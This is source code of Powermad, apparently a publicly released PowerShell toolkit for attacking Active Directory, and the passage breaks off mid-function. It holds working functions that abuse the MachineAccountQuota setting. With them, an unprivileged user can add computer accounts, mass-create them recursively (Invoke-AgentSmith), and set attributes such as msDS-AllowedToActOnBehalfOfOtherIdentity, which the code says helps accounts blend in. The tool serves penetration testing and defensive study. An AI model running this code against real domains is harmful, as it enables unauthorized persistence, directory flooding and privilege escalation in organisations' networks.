<#
Powermad - PowerShell MachineAccountQuota and DNS exploit tools
Author: Kevin Robertson (@kevin_robertson)  
License: BSD 3-Clause 
https://github.com/Kevin-Robertson/Powermad
#>

#region begin MachineAccountQuota Functions

function Disable-MachineAccount
{
    <#
    .SYNOPSIS
    This function disables a machine account that was added through New-MachineAccount. This function should be
    used with the same user that created the machine account.

    Author: Kevin Robertson (@kevin_robertson)  
    License: BSD 3-Clause 
    
    .DESCRIPTION
    Machine accounts added with New-MachineAccount cannot be deleted with an unprivileged user. Although users
    can remove systems from a domain that they added using ms-DS-MachineAccountQuota, the machine account in AD is
    just left in a disabled state. This function provides that ability by setting the AccountDisabled to true.
    Ideally, the account is removed after elevating privilege.

    .PARAMETER Credential
    PSCredential object that will be used to disable the machine account.

    .PARAMETER DistinguishedName
    Distinguished name for the computers OU.

    .PARAMETER Domain
    The targeted domain in DNS format. This parameter is required when using an IP address in the DomainController
    parameter.

    .PARAMETER DomainController
    Domain controller to target. This parameter is mandatory on a non-domain attached system.

    .PARAMETER MachineAccount
    The username of the machine account that will be disabled.

    .EXAMPLE
    Disable a machine account named test.
    Disable-MachineAccount -MachineAccount test

    .LINK
    https://github.com/Kevin-Robertson/Powermad
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)][String]$DistinguishedName,
        [parameter(Mandatory=$false)][String]$Domain,
        [parameter(Mandatory=$false)][String]$DomainController,
        [parameter(Mandatory=$true)][String]$MachineAccount,
        [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($invalid_parameter)
    {
        Write-Output "[-] $($invalid_parameter) is not a valid parameter"
        throw
    }

    if(!$DomainController -or !$Domain)
    {

        try
        {
            $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
            throw
        }

    }

    if(!$DomainController)
    {
        $DomainController = $current_domain.PdcRoleOwner.Name
        Write-Verbose "[+] Domain Controller = $DomainController"
    }

    if(!$Domain)
    {
        $Domain = $current_domain.Name
        Write-Verbose "[+] Domain = $Domain"
    }

    if($MachineAccount.EndsWith('$'))
    {
        $machine_account = $MachineAccount.SubString(0,$MachineAccount.Length - 1)
    }
    else
    {
        $machine_account = $MachineAccount  
    }

    if(!$DistinguishedName)
    {
        $distinguished_name = "CN=$machine_account,CN=Computers"
        $DC_array = $Domain.Split(".")

        ForEach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        Write-Verbose "[+] Distinguished Name = $distinguished_name"
    }
    else 
    {
        $distinguished_name = $DistinguishedName
    }

    if($Credential)
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
    }
    else
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
    }

    if(!$directory_entry.InvokeGet("AccountDisabled"))
    {

        try 
        {
            $directory_entry.InvokeSet("AccountDisabled","True")
            $directory_entry.SetInfo()
            Write-Output "[+] Machine account $MachineAccount disabled"
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
        }

    }
    else
    {
        Write-Output "[-] Machine account $MachineAccount is already disabled"
    }

    if($directory_entry.Path)
    {
        $directory_entry.Close()
    }
    
}

function Enable-MachineAccount
{
    <#
    .SYNOPSIS
    This function enables a machine account that was disabled through Disable-MachineAccount. This function should
    be used with the same user that created the machine account.

    Author: Kevin Robertson (@kevin_robertson)  
    License: BSD 3-Clause 
    
    .DESCRIPTION
    This function sets a machine account's AccountDisabled attribute to false.

    .PARAMETER Credential
    PSCredential object that will be used to disable the machine account.

    .PARAMETER DistinguishedName
    Distinguished name for the computers OU.

    .PARAMETER Domain
    The targeted domain in DNS format. This parameter is required when using an IP address in the DomainController
    parameter.

    .PARAMETER DomainController
    Domain controller to target. This parameter is mandatory on a non-domain attached system.

    .PARAMETER MachineAccount
    The username of the machine account that will be enabled.

    .EXAMPLE
    Enable a machine account named test.
    Enable-MachineAccount -MachineAccount test

    .LINK
    https://github.com/Kevin-Robertson/Powermad
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)][String]$DistinguishedName,
        [parameter(Mandatory=$false)][String]$Domain,
        [parameter(Mandatory=$false)][String]$DomainController,
        [parameter(Mandatory=$true)][String]$MachineAccount,
        [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($invalid_parameter)
    {
        Write-Output "[-] $($invalid_parameter) is not a valid parameter"
        throw
    }

    if(!$DomainController -or !$Domain)
    {

        try
        {
            $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
            throw
        }

    }

    if(!$DomainController)
    {
        $DomainController = $current_domain.PdcRoleOwner.Name
        Write-Verbose "[+] Domain Controller = $DomainController"
    }

    if(!$Domain)
    {
        $Domain = $current_domain.Name
        Write-Verbose "[+] Domain = $Domain"
    }

    if($MachineAccount.EndsWith('$'))
    {
        $machine_account = $MachineAccount.SubString(0,$MachineAccount.Length - 1)
    }
    else
    {
        $machine_account = $MachineAccount  
    }

    if(!$DistinguishedName)
    {
        $distinguished_name = "CN=$machine_account,CN=Computers"
        $DC_array = $Domain.Split(".")

        ForEach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        Write-Verbose "[+] Distinguished Name = $distinguished_name"
    }
    else 
    {
        $distinguished_name = $DistinguishedName
    }

    if($Credential)
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
    }
    else
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
    }

    if($directory_entry.InvokeGet("AccountDisabled"))
    {

        try 
        {
            $directory_entry.InvokeSet("AccountDisabled","False")
            $directory_entry.SetInfo()
            Write-Output "[+] Machine account $MachineAccount enabled"
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
        }

    }
    else
    {
        Write-Output "[-] Machine account $MachineAccount is already enabled"   
    }

    if($directory_entry.Path)
    {
        $directory_entry.Close()
    }
    
}

function Get-MachineAccountAttribute
{
    <#
    .SYNOPSIS
    This function can return values populated in machine account attributes.

    .DESCRIPTION
    This function is primarily for use with New-MachineAccount and Set-MachineAccountAttribute.
    
    Author: Kevin Robertson (@kevin_robertson)  
    License: BSD 3-Clause 

    .PARAMETER Credential
    PSCredential object that will be used to read the attribute.

    .PARAMETER DistinguishedName
    Distinguished name for the computers OU.

    .PARAMETER Domain
    The targeted domain. This parameter is mandatory on a non-domain attached system. Note this parameter
    requires a DNS domain name and not a NetBIOS version.

    .PARAMETER DomainController
    The targeted domain in DNS format. This parameter is required when using an IP address in the DomainController
    parameter.

    .PARAMETER MachineAccount
    The username of the machine account that will be modified.

    .PARAMETER Attribute
    The machine account attribute.

    .EXAMPLE
    Get the value of the description attribute from a machine account named test.
    Get-MachineAccountAttribute -MachineAccount test -Attribute description

    .LINK
    https://github.com/Kevin-Robertson/Powermad
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)][String]$DistinguishedName,
        [parameter(Mandatory=$false)][String]$Domain,
        [parameter(Mandatory=$false)][String]$DomainController,
        [parameter(Mandatory=$true)][String]$MachineAccount,
        [parameter(Mandatory=$true)][String]$Attribute,
        [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($invalid_parameter)
    {
        Write-Output "[-] $($invalid_parameter) is not a valid parameter"
        throw
    }

    if(!$DomainController -or !$Domain)
    {

        try
        {
            $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
            throw
        }

    }

    if(!$DomainController)
    {
        $DomainController = $current_domain.PdcRoleOwner.Name
        Write-Verbose "[+] Domain Controller = $DomainController"
    }

    if(!$Domain)
    {
        $Domain = $current_domain.Name
        Write-Verbose "[+] Domain = $Domain"
    }

    if($MachineAccount.EndsWith('$'))
    {
        $machine_account = $MachineAccount.SubString(0,$MachineAccount.Length - 1)
    }
    else
    {
        $machine_account = $MachineAccount
    }

    if(!$DistinguishedName)
    {
        $distinguished_name = "CN=$machine_account,CN=Computers"
        $DC_array = $Domain.Split(".")

        ForEach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        Write-Verbose "[+] Distinguished Name = $distinguished_name"
    }
    else 
    {
        $distinguished_name = $DistinguishedName
    }

    if($Credential)
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
    }
    else
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
    }

    try
    {
        $output = $directory_entry.InvokeGet($Attribute)
    }
    catch
    {
        Write-Output "[-] $($_.Exception.Message)"
    }

    if($directory_entry.Path)
    {
        $directory_entry.Close()
    }

    return $output
}

function Get-MachineAccountCreator
{
    <#
    .SYNOPSIS
    This function leverages the ms-DS-CreatorSID property on machine accounts to return a list
    of usernames or SIDs and the associated machine account. The ms-DS-CreatorSID property is only
    populated when a machine account is created by an unprivileged user. Note that SIDs will be returned
    over usernames if SID to username lookups fail through System.Security.Principal.SecurityIdentifier.

    .DESCRIPTION
    This function can be used to see how close a user is to a ms-DS-MachineAccountQuota before
    using New-MachineAccount.
    
    Author: Kevin Robertson (@kevin_robertson)  
    License: BSD 3-Clause 

    .PARAMETER Credential
    PSCredential object that will be used enumerate machine account creators.

    .PARAMETER DistinguishedName
    Distinguished name for the computers OU.

    .PARAMETER Domain
    The targeted domain in DNS format. This parameter is required when using an IP address in the DomainController
    parameter.

    .PARAMETER DomainController
    Domain controller to target. This parameter is mandatory on a non-domain attached system.

    .EXAMPLE
    Get the ms-DS-CreatorSID values for a domain.
    Get-MachineAccountCreator

    .LINK
    https://github.com/Kevin-Robertson/Powermad
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)][String]$DistinguishedName,
        [parameter(Mandatory=$false)][String]$Domain,
        [parameter(Mandatory=$false)][String]$DomainController,
        [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($invalid_parameter)
    {
        Write-Output "[-] $($invalid_parameter) is not a valid parameter"
        throw
    }

    if(!$DomainController -or !$Domain)
    {

        try
        {
            $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
            throw
        }

    }

    if(!$DomainController)
    {
        $DomainController = $current_domain.PdcRoleOwner.Name
        Write-Verbose "[+] Domain Controller = $DomainController"
    }

    if(!$Domain)
    {
        $Domain = $current_domain.Name
        Write-Verbose "[+] Domain = $Domain"
    }

    if(!$DistinguishedName)
    {
        $distinguished_name = "CN=Computers"
        $DC_array = $Domain.Split(".")

        ForEach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        Write-Verbose "[+] Distinguished Name = $distinguished_name"
    }
    else 
    {
        $distinguished_name = $DistinguishedName
    }

    try
    {

        if($Credential)
        {
            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
        }
        else
        {
            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
        }
        
        $machine_account_searcher = New-Object DirectoryServices.DirectorySearcher 
        $machine_account_searcher.SearchRoot = $directory_entry  
        $machine_account_searcher.PageSize = 1000
        $machine_account_searcher.Filter = '(&(ms-ds-creatorsid=*))'
        $machine_account_searcher.SearchScope = 'Subtree'
        $machine_accounts = $machine_account_searcher.FindAll()
        $creator_object_list = @()
            
        ForEach($account in $machine_accounts)
        {
            $creator_SID_object = $account.properties."ms-ds-creatorsid"

            if($creator_SID_object)
            {
                $creator_SID = (New-Object System.Security.Principal.SecurityIdentifier($creator_SID_object[0],0)).Value
                $creator_object = New-Object PSObject

                try
                {

                    if($Credential)
                    {
                        $creator_account = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/<SID=$creator_SID>",$Credential.UserName,$credential.GetNetworkCredential().Password)
                        $creator_account_array = $($creator_account.distinguishedName).Split(",")
                        $creator_username = $creator_account_array[($creator_account_array.Length - 2)].SubString(3).ToUpper() + "\" + $creator_account_array[0].SubString(3)    
                    }
                    else
                    {
                        $creator_username = (New-Object System.Security.Principal.SecurityIdentifier($creator_SID)).Translate([System.Security.Principal.NTAccount]).Value                        
                    }

                    Add-Member -InputObject $creator_object -MemberType NoteProperty -Name Creator $creator_username
                }
                catch
                {
                    Add-Member -InputObject $creator_object -MemberType NoteProperty -Name Creator $creator_SID
                }
                
                Add-Member -InputObject $creator_object -MemberType NoteProperty -Name "Machine Account" $account.properties.name[0]
                $creator_object_list += $creator_object
                $creator_SID_object = $null
            }

        }

    }
    catch
    {
        Write-Output "[-] $($_.Exception.Message)"
        throw
    }

    Write-Output $creator_object_list | Sort-Object -property @{Expression = {$_.Creator}; Ascending = $false}, "Machine Account" | Format-Table -AutoSize

    if($directory_entry.Path)
    {
        $directory_entry.Close()
    }

}

function Invoke-AgentSmith
{
    <#
    .SYNOPSIS
    This function leverages New-MachineAccount to recursively create as as many machine accounts as possible
    from a single unprivileged account through MachineAccountQuota. With a default MachineAccountQuota of 10,
    the most common result will be 110 accounts. This is due to the transitive quota of Q + Q * 1 where Q
    equals the MachineAccountQuota setting. The transitive quota can often be exceeded to the total number of
    created accounts can vary. I wouldn't recommend running this one on a client network unless you have a
    good reason.

    .DESCRIPTION
    This function leverages New-MachineAccount to recursively create as as many machine accounts as possible
    from a single unprivileged account through MachineAccountQuota.
    
    Author: Kevin Robertson (@kevin_robertson)  
    License: BSD 3-Clause 

    .PARAMETER Credential
    PSCredential object that will be used enumerate machine account creators.

    .PARAMETER DistinguishedName
    Distinguished name for the computers OU.

    .PARAMETER Domain
    The targeted domain in DNS format. This parameter is required when using an IP address in the DomainController
    parameter.

    .PARAMETER DomainController
    Domain controller to target. This parameter is mandatory on a non-domain attached system.

    .PARAMETER Domain
    The targeted domain in netBIOS format. This will be used to create the PSCredential object as the function cycles
    through the machine accounts.

    .PARAMETER MachineAccountPrefix
    The prefix for the machine account names. The prefix will be incremented by one for each account creation attempt.

    .PARAMETER MachineAccountQuota
    The domain's MachineAccountQuota setting.
    
    .PARAMETER NoWarning
    Switch to remove the warning prompt.

    .PARAMETER Password
    The securestring of the password for the machine accounts.

    .PARAMETER Sleep
    The delay in milliseconds between account creation attempts.

    .EXAMPLE
    Invoke-AgentSmith -MachineAccountPrefix test

    .LINK
    https://github.com/Kevin-Robertson/Powermad
    #>

    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$false)][String]$DistinguishedName,
        [parameter(Mandatory=$false)][String]$Domain,
        [parameter(Mandatory=$false)][String]$DomainController,
        [parameter(Mandatory=$false)][String]$NetBIOSDomain,
        [parameter(Mandatory=$false)][String]$MachineAccountPrefix = "AgentSmith",
        [parameter(Mandatory=$false)][Int]$MachineAccountQuota = 10,
        [parameter(Mandatory=$false)][Int]$Sleep = 0,
        [parameter(Mandatory=$false)][System.Security.SecureString]$Password,
        [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
        [parameter(Mandatory=$false)][Switch]$NoWarning,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    $i = 0
    $j = 1
    $k = 1
    $MachineAccountQuota--

    if(!$NoWarning)
    {
        $confirm_invoke = Read-Host -Prompt "Are you sure you want to do this? (Y/N)"
    }

    if(!$Password)
    {
        $password = Read-Host -Prompt "Enter a password for the new machine accounts" -AsSecureString
    }

    if(!$NetBIOSDomain)
    {

        try
        {
            $NetBIOSDomain = (Get-ChildItem -path env:userdomain).Value
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
            throw
        }

    }

    if($confirm_invoke -eq 'Y' -or $NoWarning)
    {

        :main_loop while($i -le $MachineAccountQuota)
        {
            $MachineAccount = $MachineAccountPrefix + $j
            
            try
            {
                $output = New-MachineAccount -MachineAccount $MachineAccount -Credential $Credential -Password $Password -Domain $Domain -DomainController $DomainController -DistinguishedName $DistinguishedName

                if($output -like "*The server cannot handle directory requests*")
                {
                    Write-Output "[-] Limit reached with $account"
                    $switch_account = $true
                    $j--
                }
                else
                {   
                    Write-Output $output  
                    $success = $j
                }

            }
            catch
            {

                if($_.Exception.Message -like "*The supplied credential is invalid*")
                {
                    
                    if($j -gt $success)
                    {
                        Write-Output "[-] Machine account $account was not added"
                        Write-Output "[-] No remaining machine accounts to try"
                        Write-Output "[+] Total machine accounts added = $($j - 1)"         
                        break main_loop
                    }

                    $switch_account = $true
                    $j--
                }
                else
                {
                    Write-Output "[-] $($_.Exception.Message)"    
                }

            }

            if($i -eq 0)
            {
                $account =  "$NetBIOSDomain\$MachineAccountPrefix" + $k + "$"
            }

            if($i -eq $MachineAccountQuota -or $switch_account)
            {
                Write-Output "[*] Trying machine account $account"
                $credential = New-Object System.Management.Automation.PSCredential ($account, $password)
                $i = 0
                $k++
                $switch_account = $false
            }
            else
            {
                $i++
            }

            $j++

            Start-Sleep -Milliseconds $Sleep
        }

    }
    else
    {
        Write-Output "[-] Function exited without adding machine accounts"
    }

}

function New-MachineAccount
{
    <#
    .SYNOPSIS
    This function adds a machine account with a specified password to Active Directory through an encrypted LDAP
    add request. By default standard domain users can add up to 10 systems to AD (see ms-DS-MachineAccountQuota).

    Author: Kevin Robertson (@kevin_robertson)  
    License: BSD 3-Clause 
    
    .DESCRIPTION
    The main purpose of this function is to leverage the default ms-DS-MachineAccountQuota attribute setting which
    allows all domain users to add up to 10 computers to a domain. The machine account and HOST SPNs are added
    directly through an LDAP connection to a domain controller and not by attaching the host system to Active
    Directory. This function does not modify the domain attachment and machine account associated with the host
    system.

    Note that you will not be able to remove the account without elevating privilege. You can however disable the
    account as long as you maintain access to the account used to create the machine account.

    .PARAMETER Credential
    PSCredential object that will be used to create the machine account.

    .PARAMETER Domain
    The targeted domain in DNS format. This parameter is required when using an IP address in the DomainController
    parameter.

    .PARAMETER DomainController
    Domain controller to target. This parameter is mandatory on a non-domain attached system.

    .PARAMETER DistinguishedName
    Distinguished name for the computers OU.

    .PARAMETER MachineAccount
    The machine account that will be added.

    .PARAMETER Password
    The securestring of the password for the machine account.

    .EXAMPLE
    Add a machine account named test.
    New-MachineAccount -MachineAccount test

    .EXAMPLE
    Add a machine account named test with a password of Summer2018!.
    $machine_account_password = ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force
    New-MachineAccount -MachineAccount test -Password $machine_account_password

    .LINK
    https://github.com/Kevin-Robertson/Powermad
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)][String]$DistinguishedName,
        [parameter(Mandatory=$false)][String]$Domain,
        [parameter(Mandatory=$false)][String]$DomainController,
        [parameter(Mandatory=$true)][String]$MachineAccount,
        [parameter(Mandatory=$false)][System.Security.SecureString]$Password,
        [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($invalid_parameter)
    {
        Write-Output "[-] $($invalid_parameter) is not a valid parameter"
        throw
    }

    $null = [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols")

    if(!$Password)
    {
        $password = Read-Host -Prompt "Enter a password for the new machine account" -AsSecureString
    }

    $password_BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)
    $password_cleartext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($password_BSTR)

    if(!$DomainController -or !$Domain)
    {

        try
        {
            $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
            throw
        }

    }

    if(!$DomainController)
    {
        $DomainController = $current_domain.PdcRoleOwner.Name
        Write-Verbose "[+] Domain Controller = $DomainController"
    }

    if(!$Domain)
    {
        $Domain = $current_domain.Name
        Write-Verbose "[+] Domain = $Domain"
    }
    
    $Domain = $Domain.ToLower()
    $machine_account = $MachineAccount

    if($MachineAccount.EndsWith('$'))
    {
        $sam_account = $machine_account
        $machine_account = $machine_account.SubString(0,$machine_account.Length - 1)
    }
    else 
    {
        $sam_account = $machine_account + "$"
    }

    Write-Verbose "[+] SAMAccountName = $sam_account" 

    if(!$DistinguishedName)
    {
        $distinguished_name = "CN=$machine_account,CN=Computers"
        $DC_array = $Domain.Split(".")

        ForEach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        Write-Verbose "[+] Distinguished Name = $distinguished_name"
    }
    else 
    {
        $distinguished_name = $DistinguishedName
    }

    $password_cleartext = [System.Text.Encoding]::Unicode.GetBytes('"' + $password_cleartext + '"')
    $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($DomainController,389)

    if($Credential)
    {
        $connection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier,$Credential.GetNetworkCredential())
    }
    else
    {
        $connection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)
    }
    
    $connection.SessionOptions.Sealing = $true
    $connection.SessionOptions.Signing = $true
    $connection.Bind()
    $request = New-Object -TypeName System.DirectoryServices.Protocols.AddRequest
    $request.DistinguishedName = $distinguished_name
    $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectClass","Computer")) > $null
    $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "SamAccountName",$sam_account)) > $null
    $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "userAccountControl","4096")) > $null
    $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "DnsHostName","$machine_account.$Domain")) > $null
    $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "ServicePrincipalName","HOST/$machine_account.$Domain",
        "RestrictedKrbHost/$machine_account.$Domain","HOST/$machine_account","RestrictedKrbHost/$machine_account")) > $null
    $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "unicodePwd",$password_cleartext)) > $null
    Remove-Variable password_cleartext

    try
    {
        $connection.SendRequest($request) > $null
        Write-Output "[+] Machine account $MachineAccount added"
    }
    catch
    {
        Write-Output "[-] $($_.Exception.Message)"

        if($error_message -like '*Exception calling "SendRequest" with "1" argument(s): "The server cannot handle directory requests."*')
        {
            Write-Output "[!] User may have reached ms-DS-MachineAccountQuota limit"
        }

    }

    if($directory_entry.Path)
    {
        $directory_entry.Close()
    }

}

function Remove-MachineAccount
{
    <#
    .SYNOPSIS
    This function removes a machine account with a privileged account.

    Author: Kevin Robertson (@kevin_robertson)  
    License: BSD 3-Clause 
    
    .DESCRIPTION
    Machine accounts added with MachineAccountQuote cannot be deleted with an unprivileged user. Although users
    can remove systems from a domain that they added using ms-DS-MachineAccountQuota, the machine account in AD is
    just left in a disabled state. This function provides the ability to delete a machine account once a
    privileged account has been obtained.

    .PARAMETER Credential
    PSCredential object that will be used to delete the ADIDNS node.

    .PARAMETER DistinguishedName
    Distinguished name for the ADIDNS node.

    .PARAMETER Domain
    The targeted domain in DNS format. This parameter is required when using an IP address in the DomainController
    parameter.

    .PARAMETER DomainController
    Domain controller to target. This parameter is mandatory on a non-domain attached system.

    .PARAMETER MachineAccount
    The machine account that will be removed.

    .EXAMPLE
    Remove a machine account named test with domain admin credentials.
    Remove-MachineAccount -MachineAccount test -Credential $domainadmin

    .LINK
    https://github.com/Kevin-Robertson/Powermad
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)][String]$DistinguishedName,
        [parameter(Mandatory=$false)][String]$Domain,
        [parameter(Mandatory=$false)][String]$DomainController,
        [parameter(Mandatory=$true)][String]$MachineAccount,
        [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($invalid_parameter)
    {
        Write-Output "[-] $($invalid_parameter) is not a valid parameter"
        throw
    }

    if(!$DomainController -or !$Domain)
    {

        try
        {
            $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
            throw
        }

    }

    if(!$DomainController)
    {
        $DomainController = $current_domain.PdcRoleOwner.Name
        Write-Verbose "[+] Domain Controller = $DomainController"
    }

    if(!$Domain)
    {
        $Domain = $current_domain.Name
        Write-Verbose "[+] Domain = $Domain"
    }

    if($MachineAccount.EndsWith('$'))
    {
        $machine_account = $MachineAccount.SubString(0,$MachineAccount.Length - 1)
    }
    else
    {
        $machine_account = $MachineAccount  
    }

    if(!$DistinguishedName)
    {
        $distinguished_name = "CN=$machine_account,CN=Computers"
        $DC_array = $Domain.Split(".")

        ForEach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        Write-Verbose "[+] Distinguished Name = $distinguished_name"
    }
    else 
    {
        $distinguished_name = $DistinguishedName
    }

    if($Credential)
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
    }
    else
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
    }

    try
    {
        $directory_entry.psbase.DeleteTree()
        Write-Output "[+] Machine account $MachineAccount removed"
    }
    catch
    {
        Write-Output "[-] $($_.Exception.Message)"
    }

    if($directory_entry.Path)
    {
        $directory_entry.Close()
    }

}

function Set-MachineAccountAttribute
{
    <#
    .SYNOPSIS
    This function can populate an attribute for an account that was added through New-MachineAccount. Write
    access to the attribute is required. This function should be used with the same user that created the
    machine account.

    .DESCRIPTION
    The user account that creates a machine account is granted write access to some attributes. These attributes
    can be leveraged to help an added machine account blend in better or change values that were restricted by
    validation when the account was created.

    Here is a list of some of the usual write access enabled attributes:

    AccountDisabled
    description
    displayName
    DnsHostName
    ServicePrincipalName
    userParameters
    userAccountControl
    msDS-AdditionalDnsHostName
    msDS-AllowedToActOnBehalfOfOtherIdentity
    SamAccountName

    Author: Kevin Robertson (@kevin_robertson)
    License: BSD 3-Clause

    .PARAMETER Append
    Switch: Appends a value rather than overwriting.

    .PARAMETER Credential
    PSCredential object that will be used to modify the attribute.

    .PARAMETER DistinguishedName
    Distinguished name for the computers OU.

    .PARAMETER Domain
    The targeted domain in DNS format. This parameter is required when using an IP address in the DomainController
    parameter.

    .PARAMETER DomainController
    Domain controller to target. This parameter is mandatory on a non-domain attached system.

    .PARAMETER MachineAccount
    The username of the machine account that will be modified.

    .PARAMETER Attribute
    The machine account attribute.

    .PARAMETER Value
    The machine account attribute value.

    .EXAMPLE
    Set the description attribute to a value of "test value" on a machine account named test.
    Set-MachineAccountAttribute -MachineAccount test -Attribute description -Value "test value"

    .LINK
    https://github.com/Kevin-Robertson/Powermad
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)][String]$DistinguishedName,
        [parameter(Mandatory=$false)][String]$Domain,
        [parameter(Mandatory=$false)][String]$DomainController,
        [parameter(Mandatory=$true)][String]$MachineAccount,
        [parameter(Mandatory=$true)][String]$Attribute,
        [parameter(Mandatory=$true)]$Value,
        [parameter(Mandatory=$false)][Switch]$Append,
        [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($invalid_parameter)
    {
        Write-Output "[-] $($invalid_parameter) is not a valid parameter"
        throw
    }

    if(!$DomainController -or !$Domain)
    {

        try
        {
            $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
            throw
        }

    }

    if(!$DomainController)
    {
        $DomainController = $current_domain.PdcRoleOwner.Name
        Write-Verbose "[+] Domain Controller = $DomainController"
    }

    if(!$Domain)
    {
        $Domain = $current_domain.Name
        Write-Verbose "[+] Domain = $Domain"
    }

    if($MachineAccount.EndsWith('$'))
    {
        $machine_account = $MachineAccount.SubString(0,$MachineAccount.Length - 1)
    }
    else
    {
        $machine_account = $MachineAccount  
    }

    if(!$DistinguishedName)
    {
        $distinguished_name = "CN=$machine_account,CN=Computers"
        $DC_array = $Domain.Split(".")

        ForEach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        Write-Verbose "[+] Distinguished Name = $distinguished_name"
    }
    else 
    {
        $distinguished_name = $DistinguishedName
    }

    if($Credential)
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
    }
    else
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
    }

    try
    {

        if($Append)
        {
            $directory_entry.$Attribute.Add($Value) > $null
            $directory_entry.SetInfo()
            Write-Output "[+] Machine account $machine_account attribute $Attribute appended"
        }
        else
        {
            $directory_entry.InvokeSet($Attribute,$Value)
            $directory_entry.SetInfo()
            Write-Output "[+] Machine account $machine_account attribute $Attribute updated"
        }
    }
    catch
    {
